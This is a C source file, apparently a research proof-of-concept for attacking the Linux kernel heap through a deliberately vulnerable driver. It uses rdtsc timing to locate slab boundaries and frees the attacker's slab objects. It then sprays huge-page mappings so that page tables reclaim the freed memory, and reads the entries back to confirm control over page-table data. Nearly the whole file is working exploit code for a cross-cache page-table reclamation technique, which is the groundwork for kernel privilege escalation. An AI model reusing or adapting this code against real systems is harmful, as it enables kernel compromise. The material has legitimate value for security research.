#define _POSIX_SOURCE
#include "uhelper.h"
#include "pgtable.h"
#include "cacheutils.h"

/**
 * Constants
 */
#define PMD_SIZE (1ULL << 21)
#define PUD_SIZE (1ULL << 30)
#define PAGE_SIZE (1ULL << 12)

/**
 * Interacting functions with the kernel
 */
#define ALLOC(i) do { int ret = alloc_obj(i, cur->size, 0); if (ret) pr_error("alloc timing error\n"); } while (0)
#define FREE(i) do { int ret = free_obj(i); if (ret) pr_error("free timing error\n"); } while (0)
#define WRITE(i, buf) do { int ret = write_obj(i, cur->size, buf); if (ret) pr_error("write error\n"); } while (0)
#define READ(i, buf) do { int ret = read_obj(i, cur->size, buf); if (ret) pr_error("read error\n"); } while (0)
#define THRESHOLD -800

/**
 * Vulnerable kernel driver for the kernel heap vulnerability
 */
#include "slab_settings.h"

#define WARMUP_DATA_SZ (1ULL << 30)
static void *warmup_data;
void mmap_warmup(void)
{
    pr_debug("alloc virtual memory\n");
    warmup_data = mmap(0, WARMUP_DATA_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); 
    if (warmup_data == MAP_FAILED)
        pr_perror("mmap");
    memset(warmup_data, 0x41, WARMUP_DATA_SZ);
}

static size_t *start_indexes;
static size_t largest_index;

void alloc_objs(void)
{
    pr_debug("allocate %ld objs\n", cur->allocs);
    for (size_t i = 0; i < cur->allocs; ++i)
        ALLOC((1 << 17) + i);
}

void timed_alloc_objs(void)
{
    size_t t0;
    size_t t1;
    ssize_t time = 0;
    ssize_t prev_time = 0;
    ssize_t derived_time = 0;
    ssize_t start = -1;
    size_t running = 0;

    pr_debug("allocate %ld objs\n", cur->allocs);
    for (size_t i = 0; i < cur->allocs; ++i) {
        sched_yield();
        t0 = rdtsc_begin();
        ALLOC(i);
        t1 = rdtsc_end();
        prev_time = time;
        time = t1 - t0;
        if (i > cur->allocs/4) {
            derived_time = time - prev_time;
            if (start == -1) {
                if (derived_time < THRESHOLD) {
                    start = i;
                    continue;
                }
            } else if (i - start == cur->obj_per_slab) {
                if (derived_time < THRESHOLD) {
                    start_indexes[running] = start - 1;
                    running++;
                    if (running == cur->slab_per_chunk) {
                        largest_index = i;
                        break;
                    }
                    start = i;
                } else {
                    start = i;
                    running = 0;
                }
            }
        }
    }
    if (running != cur->slab_per_chunk) {
        pr_warning("RETRY (start not found)\n");
        exit(0);
    }
    for (size_t i = 0; i < cur->slab_per_chunk; ++i)
        pr_debug("start %ld\n", start_indexes[i]);
}

void zeroed_objs(void)
{
    static char buf[PAGE_SIZE];
    pr_debug("zero out %ld objs\n", largest_index);
    memset(buf, 0, PAGE_SIZE);
    for (size_t i = 0; i < largest_index; ++i)
        WRITE(i, (size_t)buf);
}

size_t is_pt(size_t *chunk, size_t size)
{
    size_t found = 0;
    for (size_t i = 0; i < size; ++i)
        found |= (chunk[i] & _PAGE_TABLE) == _PAGE_TABLE;
    return found;
}

struct sysinfo {
    long uptime;             /* Seconds since boot */
    unsigned long loads[3];  /* 1, 5, and 15 minute load averages */
    unsigned long totalram;  /* Total usable main memory size */
    unsigned long freeram;   /* Available memory size */
    unsigned long sharedram; /* Amount of shared memory */
    unsigned long bufferram; /* Memory used by buffers */
    unsigned long totalswap; /* Total swap space size */
    unsigned long freeswap;  /* swap space still available */
    unsigned short procs;    /* Number of current processes */
    unsigned long totalhigh; /* Total high memory size */
    unsigned long freehigh;  /* Available high memory size */
    unsigned int mem_unit;   /* Memory unit size in bytes */
    char _f[20-2*sizeof(long)-sizeof(int)]; /* Padding to 64 bytes */
};

int sysinfo(struct sysinfo *info)
{
    return syscall(__NR_sysinfo, info);
}
           
unsigned long mem_avail(void)
{
    struct sysinfo info;
    
    if (sysinfo(&info) < 0)
        return 0;
        
    return info.freeram;
}

#define MEM_LIMIT (150 * 1024 * 1024)
#define DATA_SZ (1 << 10)
static void *datas[DATA_SZ];
static void *prior_datas[DATA_SZ];
void free_objs_and_alloc_mmap(void)
{
    static char zeroed[PAGE_SIZE];
    static char buf[PAGE_SIZE];
    int ret;
    size_t i = 0;
    size_t data_size;

    while (mem_avail() > MEM_LIMIT && i < DATA_SZ) {
        /* alloc dummy for pud mapping */
        prior_datas[i] = mmap((void *)(0xd0000000000 + 32 * PUD_SIZE * i), PMD_SIZE + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
        if (prior_datas[i] == MAP_FAILED)
            pr_perror("mmap");
        /* alloc and map pud */
        ret = madvise(prior_datas[i], PMD_SIZE + PAGE_SIZE, MADV_HUGEPAGE);
        if (ret < 0)
            pr_perror("madvise");
        memset(prior_datas[i], 0x42, PMD_SIZE + PAGE_SIZE);
        /* alloc for pmd and pt mapping */
        datas[i] = mmap((void *)(0xd0000000000 + 32 * PUD_SIZE * i + 2 * PUD_SIZE), PMD_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_HUGETLB, -1, 0);
        if (datas[i] == MAP_FAILED)
            pr_perror("mmap");
        ++i;
        sched_yield();
    }
    data_size = i;

    for (size_t i = 0; i < data_size; ++i)
        munmap(prior_datas[i], PMD_SIZE);

    pr_debug("empty caches and free objs slab per chunk %ld obj per slab %ld\n", cur->slab_per_chunk, cur->obj_per_slab);
    FREE(start_indexes[0] - 3);
    FREE(start_indexes[0] - 2);
    FREE(start_indexes[0] - 1);
    for (size_t i = 0; i < cur->slab_per_chunk; ++i) {
        for (ssize_t j = 0; j < (ssize_t)cur->obj_per_slab; ++j) {
            FREE(start_indexes[i] + j);
        }
    }
    /* map pmd and pt */
    for (size_t i = 0; i < data_size; ++i)
        memset(datas[i], 0x42, PAGE_SIZE);

    pr_debug("free mem %ld MB\n", mem_avail() / 1024 / 1024);

    size_t success = 0;
    /**
     * pmd and pts
     */
    for (size_t i = 0; i < cur->slab_per_chunk; ++i) {
        size_t already_print = 0;
        for (ssize_t j = 0; j < (ssize_t)cur->obj_per_slab; ++j) {
            READ(start_indexes[i] + j, (size_t)buf);
            if (memcmp(zeroed, buf, cur->size)) {
                if (is_pt((size_t *)buf, cur->size/8) && !already_print) {
                    already_print = 1;
                    size_t pmde = *(size_t *)buf;
                    size_t data_pmde = 0;
                    size_t data_pte = 0;
                    size_t found = 0;
                    for (size_t k = 0; k < DATA_SZ; ++k) {
                        for (size_t l = 0; l < PUD_SIZE/PMD_SIZE; ++l) {
                            arb_pagetable_walk((size_t)datas[k] + l * PMD_SIZE, 0, 0, &data_pmde, &data_pte);
                            if (pmde == data_pmde) {
                                found = 1;
                                already_print = 0;
                                // print_pagetable_walk((size_t)datas[k] + l * PMD_SIZE);
                                // hex_dump(datas[k], PAGE_SIZE/8);
                                goto DONE;
                            }
                            if (pmde == data_pte) {
                                pr_info("is pte\n");
                                // print_pagetable_walk((size_t)datas[k] + l * PMD_SIZE);
                                goto DONE;
                            }
                        }
                    }
DONE:
                    if (found)
                        success |= (i == cur->reclaimed_page_table);
                    pr_info("slab %ld (alloc nb %ld) %s\n", i, start_indexes[i] + j, found ? "pmd" : "used but not from pmd");
                    if (found && ((pmde & PAGE_TABLE_LARGE) != PAGE_TABLE_LARGE))
                        pr_info("size bit of pmde %016zx is not set\n", pmde);
                    pr_info("pmde %016zx\n", *(size_t *)buf);
                    // wait_input();
                } else if (!already_print) {
                    already_print = 1;
                    pr_info("slab %ld (alloc nb %ld) used but not from pmd\n", i, start_indexes[i] + j);
                    // hex_dump((size_t *)buf, cur->size/8);
                }
            }
        }
    }
    if (success)
        pr_success("SUCCESS\n");
    else
        pr_warning("FAIL\n");
}

/**
 * frees the attacker-allocated objects
 */
void cleanup(void)
{
    for (size_t i = 0; i < cur->allocs; ++i)
        FREE((1 << 17) + i);
    for (size_t i = 0; i < start_indexes[0]-3; ++i)
        FREE(i);
}

/**
 * main function
 */
int main(int argc, char *argv[])
{
    size_t generic_cache_size;
    if (argc < 2 || argc > 3)
        pr_error("usage: %s <generic_cache_size> <cpu_pinning?>\n", argv[0]);
    generic_cache_size = strtol(argv[1], 0, 10);
    if (generic_cache_size < 512)
        pr_error("only mulyi-page slabs, i.e., object size larger than 256\n");

    PRINT_WARNING = 1;
    PRINT_INFO = 1;
    PRINT_DEBUG = 0;
    
    pr_info("start\n");
    if (argc == 3 && !strcmp(argv[2], "0"))
        helper_init_no_pinning();
    else
        helper_init();
    set_current_slab_info(generic_cache_size);
    start_indexes = malloc(sizeof(size_t)*cur->slab_per_chunk);

    pr_debug("alloc\n");
    alloc_objs();
    timed_alloc_objs();
    zeroed_objs();

    pr_debug("allocate free pages as warmup\n");
    mmap_warmup();

    pr_debug("free slab page\n");
    free_objs_and_alloc_mmap();

    pr_debug("cleanup\n");
    cleanup();
    
    pr_info("done\n");
}
